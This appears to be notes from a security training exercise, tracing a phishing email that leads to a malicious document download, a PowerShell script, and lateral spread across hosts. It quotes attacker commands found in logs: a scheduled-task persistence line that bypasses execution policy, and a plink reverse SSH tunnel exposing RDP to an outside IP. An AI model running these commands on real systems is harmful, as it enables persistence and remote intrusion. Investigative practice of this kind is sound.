She received a suspicious email from newspaper_jobs@gmail.com at 2024-01-05T09:42:05Z. 
 
The link included in the email is https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx
Look into the network log to see if the link is clicked.
She clicked the link at 2024-01-05T10:23:17Z. 
Look into file download to see if the file is downloaded.
The file is downloaded on Sonia’s host at 2024-01-05T10:24:04Z. The file path is C:\Users\sogose\Downloads\Valdorian_Times_Editorial_Offer_Letter.docx
Look into the file hash to see if it’s malicious. (Should be malicious but since it’s exercise, no record is found of the hash on VirusTotal)
60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f
Let’s stay on the same host and see any malicious activity right after the download.
A powershell script was downloaded at 2024-01-05T10:24:32Z. C:\ProgramData\hacktivist_manifesto.ps1	hacktivist_manifesto.ps1	explorer.exe
Hash value is: 1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252
VirusTotal show is file as malicious virus.

Now obtain the power shell in a controlled environment. 
Plink is used to establish SSH.
Now look into process creation after the download.
Search for the ps file, and we see a task is scheduled at 2024-01-05T11:22:44Z to run the script under powershell every 5 hours and by pass execution policy.
schtasks /create /sc hourly /mo 5 /tn "Hacktivist Manifesto" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1" 
The script was run on Sonia’s host at 2024-01-05T11:55:22Z.
powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1

Now Look into plink process under process event log on Sonia’s host.
plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 136.130.190.181
This tunnel would allow Remote Desktop Protocol (RDP) connections from the remote machine (IP: 136.130.190.181) to be forwarded to the localhost (your machine), effectively exposing your local machine’s RDP service (on port 3389) to the remote machine.
-l $had0w: This indicates the login username on the remote machine.
-pw thruthW!llS3tUfree: This specifies the password for the SSH login.
There is no other suspicious activity afterward.
Now look into process event to see if the ps file run on any other host especially the printer and Ronnie.
We see many hosts got affected including Ronnie,
